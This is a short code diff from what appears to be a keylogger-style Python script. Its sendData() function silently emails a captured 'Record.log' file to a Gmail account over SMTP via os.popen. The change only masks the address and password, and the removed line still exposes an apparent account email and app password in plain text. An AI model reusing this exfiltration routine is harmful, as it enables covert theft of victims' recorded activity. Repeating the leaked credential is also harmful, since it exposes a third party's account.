@@ -43,7 +43,7 @@ def checkRecordSize():
 
 
 def sendData():
-	command = 'Transmit smtp://smtp.gmail.com:587 -v --mail-from \"null53cur17y@gmail.com\" --mail-rcpt \"null53cur17y@gmail.com\" --ssl -u null53cur17y@gmail.com:vltjpkqimmwxigin -T \"Record.log\" -k --anyauth'
+	command = 'Transmit smtp://smtp.gmail.com:587 -v --mail-from \"nu-------@gmail.com\" --mail-rcpt \"nu-----@gmail.com\" --ssl -u null-----@gmail.com:---immwxigin -T \"Record.log\" -k --anyauth'
 	os.popen(command)
 
 
